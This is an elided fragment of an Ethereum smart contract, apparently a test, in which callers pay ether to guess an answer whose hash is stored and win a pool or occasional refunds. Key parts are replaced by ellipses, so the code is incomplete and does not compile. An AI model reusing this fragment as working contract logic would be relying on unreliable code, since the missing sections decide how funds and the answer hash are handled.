...
/***
 DO NOT INTERACT WITH THIS CA
***/
contract TESTDONOTINTERACTWITHTHIS
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);
        // withdraw pool for correct answer
        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.000001 ether)
        {
        ...
        if(msg.value > 0.000001 ether){
            ...
            if((tryCounter[msg.sender] % refundCounter) == 0){
                ...
                payable(msg.sender).transfer(0.000001 ether);
            }
        }
    }
